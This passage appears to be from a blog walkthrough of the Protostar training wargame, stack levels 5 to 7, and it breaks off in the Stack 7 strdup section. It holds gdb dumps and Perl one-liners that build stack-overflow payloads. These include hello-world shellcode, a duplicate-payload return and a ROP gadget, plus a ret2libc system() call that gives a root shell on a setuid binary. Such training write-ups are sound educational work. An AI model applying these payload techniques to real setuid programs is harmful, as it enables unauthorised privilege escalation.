<span class="mh">0x080483cd</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080483d1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span> <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080483d4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span> <span class="n">call</span>   <span class="mh">0x80482e8</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080483d9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;:</span> <span class="n">leave</span>  
<span class="mh">0x080483da</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;:</span> <span class="n">ret</span>  
</code></pre></div>
</p>

<p>The return address should be the start of $buffer at 0xbffff610.
From the previous example we know that we have to write 76 bytes.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">stack5</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">vec5_1</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">main</span> <span class="p">(</span><span class="n">argc</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="mh">0xbffff704</span><span class="p">)</span> <span class="n">at</span> <span class="n">stack5</span><span class="o">/</span><span class="n">stack5</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">11</span>
<span class="mi">11</span>  <span class="n">stack5</span><span class="o">/</span><span class="n">stack5</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span><span class="p">.</span>
  <span class="n">in</span> <span class="n">stack5</span><span class="o">/</span><span class="n">stack5</span><span class="p">.</span><span class="n">c</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">24</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbffff600</span><span class="o">:</span> <span class="mh">0xbffff610</span>  <span class="mh">0xb7ec6165</span>  <span class="mh">0xbffff618</span>  <span class="mh">0xb7eada75</span>
<span class="mh">0xbffff610</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff620</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff630</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff640</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff650</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xbffff610</span>
</code></pre></div>
</p>

<p>After that we can add a simple shell code.
For demonstration purpose a simple &ldquo;hello world&rdquo; shellcode will do.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;\xe9\x1e\x00\x00\x00&quot; .&quot;\xb8\x04\x00\x00\x00&quot; .&quot;\xbb\x01\x00\x00\x00&quot; .&quot;\x59&quot; .&quot;\xba\x0f\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xb8\x01\x00\x00\x00&quot; .&quot;\xbb\x00\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xe8\xdd\xff\xff\xff&quot; .&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&quot; .&quot;\xCC&quot;x(76-53) .&quot;\x10\xf6\xff\xbf&quot;);&#39;</span> &gt; /tmp/vec5
</code></pre></div>
</p>

<p>Debugging the shellcode in gdb works.
<strong>Stack addresses change with gdb attached.</strong>
So we have to start from a core dump.
To enable core dumps on suid binaries we have to set the proper flag.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span><span class="nb">echo </span><span class="m">2</span> &gt; /proc/sys/fs/suid_dumpable
</code></pre></div>
</p>

<p>Now we can try to run the exploit code directly against the binary.
The exploit fails but a core dump is created.
With gdb we can now examine the stack and adjust the offsets.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="err">$</span><span class="n">gdb</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">stack5</span> <span class="o">--</span><span class="n">core</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">core</span><span class="mf">.4</span><span class="p">.</span><span class="n">stack5</span><span class="mf">.3688</span>
<span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0.1</span><span class="o">-</span><span class="n">debian</span>
<span class="p">...</span>
<span class="n">Core</span> <span class="n">was</span> <span class="n">generated</span> <span class="n">by</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">stack5</span><span class="err">&#39;</span><span class="p">.</span>
<span class="n">Program</span> <span class="n">terminated</span> <span class="n">with</span> <span class="n">signal</span> <span class="mi">4</span><span class="p">,</span> <span class="n">Illegal</span> <span class="n">instruction</span><span class="p">.</span>
<span class="cp">#0  0xbffff645 in ?? ()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">24</span><span class="n">x</span> <span class="mh">0xbffff610</span>
<span class="mh">0xbffff610</span><span class="o">:</span> <span class="mh">0xbffff620</span>  <span class="mh">0xb7ec6165</span>  <span class="mh">0xbffff628</span>  <span class="mh">0xb7eada75</span>
<span class="mh">0xbffff620</span><span class="o">:</span> <span class="mh">0x00001ee9</span>  <span class="mh">0x0004b800</span>  <span class="mh">0x01bb0000</span>  <span class="mh">0x59000000</span>
<span class="mh">0xbffff630</span><span class="o">:</span> <span class="mh">0x00000fba</span>  <span class="mh">0xb880cd00</span>  <span class="mh">0x00000001</span>  <span class="mh">0x000000bb</span>
<span class="mh">0xbffff640</span><span class="o">:</span> <span class="mh">0xe880cd00</span>  <span class="mh">0xffffffdd</span>  <span class="mh">0x6c6c6548</span>  <span class="mh">0x57202c6f</span>
<span class="mh">0xbffff650</span><span class="o">:</span> <span class="mh">0x646c726f</span>  <span class="mh">0xcccccc21</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff660</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xbffff640</span>
</code></pre></div>
</p>

<p>The correct offset should be 0xbffff620.
Let&rsquo;s try again with the following command.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;\xe9\x1e\x00\x00\x00&quot; .&quot;\xb8\x04\x00\x00\x00&quot; .&quot;\xbb\x01\x00\x00\x00&quot; .&quot;\x59&quot; .&quot;\xba\x0f\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xb8\x01\x00\x00\x00&quot; .&quot;\xbb\x00\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xe8\xdd\xff\xff\xff&quot; .&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&quot; .&quot;\xCC&quot;x(76-53) .&quot;\x20\xf6\xff\xbf&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack5
<span class="go">Hello, World!�</span>
</code></pre></div>
</p>

<h1 id="stack-6:66762231c63507f267ea415391222411">Stack 6</h1>

<p>At first, we have to identify the location of the overflow.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x080484a4</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x4c</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484a7</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080484aa</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048380</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>
</p>

<p>The code loads the address of EBP-0x4c into EAX.
So to overwrite the return address we have to write 0x50 bytes.
Let&rsquo;s test the alignment.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span><span class="o">-</span><span class="mi">100</span>
<span class="mh">0xbffff5e4</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0xb7fe1b28</span>  <span class="mh">0x00000001</span>  <span class="mh">0x00000000</span>
<span class="mh">0xbffff5f4</span><span class="o">:</span> <span class="mh">0x00000001</span>  <span class="mh">0xb7fff8f8</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff604</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff614</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff624</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff634</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xbffff644</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0x08048500</span>  <span class="mh">0x08048520</span>
<span class="mh">0xbffff654</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0xbffff6d8</span>  <span class="mh">0xb7eadc76</span>  <span class="mh">0x00000001</span>
</code></pre></div>
</p>

<p>It worked!
The next step is to set EIP.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;\xCC&quot;x80 .&quot;\xfc\xf5\xff\xbf&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack6
<span class="go">input path please: bzzzt (0xbffff604)</span>
</code></pre></div>
</p>

<p>This did not work.
Lets examine what&rsquo;s going on.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x080484af</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">43</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>     <span class="p">;</span> <span class="n">load</span> <span class="k">return</span> <span class="n">address</span>
<span class="mh">0x080484b2</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x080484b5</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484b8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;:</span>  <span class="n">and</span>    <span class="err">$</span><span class="mh">0xbf000000</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>   <span class="p">;</span> <span class="n">apply</span> <span class="n">mask</span>
<span class="mh">0x080484bd</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>  <span class="n">cmp</span>    <span class="err">$</span><span class="mh">0xbf000000</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>   <span class="p">;</span> <span class="n">check</span> <span class="n">address</span>
<span class="mh">0x080484c2</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;:</span>  <span class="n">jne</span>    <span class="mh">0x80484e4</span>
</code></pre></div>
</p>

<p>The binary checks whether the return address starts with \xbf.
Our shellcode is placed in exactly this part of memory.
This means that we cannot simply return to our shellcode
Instead we have to find another way to exploit the overflow.</p>

<h2 id="duplicate-payload:66762231c63507f267ea415391222411">Duplicate Payload</h2>

<p>The first option is when our payload is also loaded into another memory location.
In order to look for a location the need to debug the binary.
With gdb we can even search the memory for a pattern.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">files</span>
<span class="n">Symbols</span> <span class="n">from</span> <span class="s">&quot;/opt/protostar/bin/stack6&quot;</span><span class="p">.</span>
<span class="n">Local</span> <span class="n">core</span> <span class="n">dump</span> <span class="nl">file</span><span class="p">:</span>
  <span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">core</span><span class="mf">.11</span><span class="p">.</span><span class="n">stack6</span><span class="mf">.3845</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">file</span> <span class="n">type</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span><span class="p">.</span>
  <span class="mh">0x08048000</span> <span class="o">-</span> <span class="mh">0x08049000</span> <span class="n">is</span> <span class="n">load1</span>
  <span class="mh">0x08049000</span> <span class="o">-</span> <span class="mh">0x0804a000</span> <span class="n">is</span> <span class="n">load2</span>
  <span class="mh">0xb7e96000</span> <span class="o">-</span> <span class="mh">0xb7e97000</span> <span class="n">is</span> <span class="n">load3</span>
  <span class="mh">0xb7e97000</span> <span class="o">-</span> <span class="mh">0xb7e98000</span> <span class="n">is</span> <span class="n">load4a</span>
  <span class="mh">0xb7e98000</span> <span class="o">-</span> <span class="mh">0xb7e98000</span> <span class="n">is</span> <span class="n">load4b</span>
  <span class="mh">0xb7fd5000</span> <span class="o">-</span> <span class="mh">0xb7fd5000</span> <span class="n">is</span> <span class="n">load5</span>
  <span class="mh">0xb7fd6000</span> <span class="o">-</span> <span class="mh">0xb7fd8000</span> <span class="n">is</span> <span class="n">load6</span>
  <span class="mh">0xb7fd8000</span> <span class="o">-</span> <span class="mh">0xb7fd9000</span> <span class="n">is</span> <span class="n">load7</span>
  <span class="mh">0xb7fd9000</span> <span class="o">-</span> <span class="mh">0xb7fdc000</span> <span class="n">is</span> <span class="n">load8</span>
  <span class="mh">0xb7fde000</span> <span class="o">-</span> <span class="mh">0xb7fe2000</span> <span class="n">is</span> <span class="n">load9</span>
<span class="p">...</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">find</span> <span class="o">/</span><span class="n">w1</span> <span class="mh">0xb7fde000</span><span class="p">,</span> <span class="mh">0xb7fde200</span><span class="p">,</span> <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde000</span>
<span class="mi">1</span> <span class="n">pattern</span> <span class="n">found</span><span class="p">.</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">x</span> <span class="mh">0xb7fde000</span>
<span class="mh">0xb7fde000</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde010</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde020</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde030</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde040</span><span class="o">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>  <span class="mh">0xcccccccc</span>
<span class="mh">0xb7fde050</span><span class="o">:</span> <span class="mh">0xbffff5fc</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
<span class="mh">0xb7fde060</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</code></pre></div>
</p>

<p>We are lucky, our data is also stored outside of the filtered memory space.
To exploit the overflow we cansimply stick to the Hello World shellcode.
Subsequently, we only have to update the return address in order to successfully return to our shellcode.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span>perl -e <span class="s1">&#39;print(&quot;\x90&quot;x4 .&quot;\xe9\x1e\x00\x00\x00&quot; .&quot;\xb8\x04\x00\x00\x00&quot; .&quot;\xbb\x01\x00\x00\x00&quot; .&quot;\x59&quot; .&quot;\xba\x0f\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xb8\x01\x00\x00\x00&quot; .&quot;\xbb\x00\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xe8\xdd\xff\xff\xff&quot; .&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&quot; .&quot;\xCC&quot;x(80-53-4) .&quot;\x04\xe0\xfd\xb7&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack6
<span class="go">input path please: got path �����</span>
<span class="go">Hello, World!�</span>
</code></pre></div>
</p>

<h2 id="ret2libc:66762231c63507f267ea415391222411">ret2Libc</h2>

<p>Another option we have got is utilizing library functionality loaded during runtime.
To do this we have to understand the respective functions and their arguments.
For this example we are going to stick with the system() function call to execute our code.
This will provide us with a root shell.
Another option would be the use of execl() with the respective arguments.
Let&rsquo;s quickly take a look at the memory layout before exploitation.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go"> ------------ ----------- -----------</span>
<span class="go">| buffer[64] | saved EBP | saved EIP |</span>
<span class="go"> ------------ ----------- -----------</span>
<span class="go"> and after the overflow</span>
<span class="go"> ------------ ----------- ----------- ------------ ------------</span>
<span class="go">|       buffer[80]       | &amp;system() |   &amp;exit()  | &amp;shellcode |</span>
<span class="go"> ------------ ----------- ----------- ------------ ------------</span>
</code></pre></div>
</p>

<p>In this example we will utilize system() and exit().
The corresponding addresses can be retrieved via gdb.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">print</span> <span class="n">system</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7ecffb0</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">print</span> <span class="n">exit</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7ec60c0</span> <span class="o">&lt;</span><span class="n">GI_exit</span><span class="o">&gt;</span>
</code></pre></div>
</p>

<p>Remember, we are going to execute a payload via system().
Therefore, the environment variable will contain the path to the shellcode.
The shellcode in this example is simply a binary.
The absolute path to the respective binary will be stored in a environment variable.
We then have to calculate the address of the variable during runtime.
To do this, just grab an appropriate script online that helps you doing so.
This adress is placed on the stack to act as an argument for system().</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span> <span class="nb">export </span><span class="nv">CODE</span><span class="o">=</span><span class="s2">&quot;/home/user/13357&quot;</span>
<span class="gp">user@protostar:/$</span> /home/user/getenvaddr CODE /opt/protostar/bin/stack6
<span class="go">CODE will be at 0xbfffff8d</span>
</code></pre></div>
</p>

<p>Now we have all the essential pointers and only need to prepare the shellcode.
So this time we want to gain a root shell with the exploit.
<strong>Keep in mind that bash will drop all privileges.</strong>
Therefore we are going to utilize a shellcode from exploit-db <a href="http://www.exploit-db.com/exploits/13357/">13367</a>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/opt/protostar/bin$</span> perl -e <span class="s1">&#39;print(&quot;\xCC&quot;x(80) .&quot;\xb0\xff\xec\xb7&quot; .&quot;\xc0\x60\xec\xb7&quot; .&quot;\x8d\xff\xff\xbf&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack6
<span class="go">input path please: got path �����</span>
<span class="gp">#</span> whoami
<span class="go">root</span>
</code></pre></div>
</p>

<h2 id="rop:66762231c63507f267ea415391222411">ROP</h2>

<p>One more option we do have is utilizing return-oriented programming.
This is especially useful when we encounter NX technology.
Also, ASLR does not affect the program code itself.
This means, ASLR can also be defeated.
For this scenario, we simply take the next RET function at hand.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disassemble</span> <span class="n">getpath</span>
<span class="p">...</span>
<span class="mh">0x080484f9</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span> <span class="n">ret</span>
</code></pre></div>
</p>

<p>So we have to set the return address to 0x080484f9.
The return address is set to point at our buffer at 0xbffff5ac.</p>

<p>Usually ROP is utilized to circumvent DEP protection.
Again, we place our Hello world payload in the buffer.
The exploit can be triggered via the following command.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">user@protostar:/$</span> perl -e <span class="s1">&#39;print(&quot;\x90&quot;x4 .&quot;\xe9\x1e\x00\x00\x00&quot; .&quot;\xb8\x04\x00\x00\x00&quot; .&quot;\xbb\x01\x00\x00\x00&quot; .&quot;\x59&quot; .&quot;\xba\x0f\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xb8\x01\x00\x00\x00&quot; .&quot;\xbb\x00\x00\x00\x00&quot; .&quot;\xcd\x80&quot; .&quot;\xe8\xdd\xff\xff\xff&quot; .&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&quot; .&quot;\xCC&quot;x(80-53-4) .&quot;\xf9\x84\x04\x08&quot; .&quot;\xdc\xf5\xff\xbf&quot;);&#39;</span> <span class="p">|</span> /opt/protostar/bin/stack6
<span class="go">input path please: got path �����</span>
<span class="go">Hello, World!�</span>
</code></pre></div>
</p>

<h1 id="stack-7:66762231c63507f267ea415391222411">Stack 7</h1>

<p>This example is based binary from the previous exercise.
Although, this time the return address is again restricted.
So, we need to find another way to execute our payload.
Let&rsquo;s take a look at the source code.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="p">...</span>
<span class="mh">0x080484ea</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x80483a4</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080484ef</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">43</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080484f2</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x080484f5</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>         <span class="p">;</span> <span class="n">copy</span> <span class="k">return</span> <span class="n">address</span> <span class="n">into</span> <span class="n">EAX</span>
<span class="mh">0x080484f8</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;:</span>	<span class="n">and</span>    <span class="err">$</span><span class="mh">0xb0000000</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">zero</span> <span class="n">out</span> <span class="n">all</span> <span class="n">non</span> <span class="n">important</span> <span class="n">bits</span>
<span class="mh">0x080484fd</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="err">$</span><span class="mh">0xb0000000</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>        <span class="p">;</span> <span class="n">check</span> <span class="n">first</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">address</span>
<span class="mh">0x08048502</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x8048524</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span>
<span class="p">...</span>
<span class="mh">0x0804853e</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">122</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x80483f4</span> <span class="o">&lt;</span><span class="n">strdup</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08048543</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span> <span class="n">leave</span>  
<span class="mh">0x08048544</span> <span class="o">&lt;</span><span class="n">getpath</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span> <span class="n">ret</span>    
</code></pre></div>
</p>

<h2 id="strdup:66762231c63507f267ea415391222411">strdup</h2>

<p>Fortunately for us, strdup() is called just before returning.
The function copies the target buffer to the heap.
The return value, the address of the target buffer, is stored in EAX.
So we simply need to overwrite the return address with a call to EAX.</p>

<p><div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="o">--------------------------------------------------------------------------</span><span class="p">[</span><span class="n">regs</span><span class="p">]</span>
